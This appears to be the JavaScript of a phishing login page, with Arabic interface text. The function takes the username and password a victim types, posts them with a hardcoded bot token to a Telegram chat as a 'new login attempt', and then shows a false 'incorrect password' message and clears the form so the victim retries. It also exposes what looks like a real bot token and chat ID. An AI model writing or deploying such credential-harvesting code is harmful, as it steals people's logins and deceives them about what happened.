function sendData() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!username || !password) {
    alert("يرجى ملء جميع الحقول.");
    return;
  }

  const botToken = "8146579232:AAHdOSLjyhfySecv2N9Ul6ShO5tkKR_o8M4";
  const chatId = "8077243371";
  const message = `
*محاولة تسجيل دخول جديدة*
---------------------
*اسم المستخدم:* ${username}
*كلمة السر:* ${password}
`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.ok) {
      alert("تم إرسال البيانات بنجاح.");
    } else {
      alert("فشل في إرسال البيانات.");
    }
  })
  .catch(error => {
    console.error("Error:", error);
    alert("حدث خطأ أثناء الإرسال.");
  });

  alert("البريد الإلكتروني/رقم الهاتف أو كلمة السر غير صحيحة. يرجى المحاولة مرة أخرى.");

  document.getElementById('username').value = '';
  document.getElementById('password').value = '';
}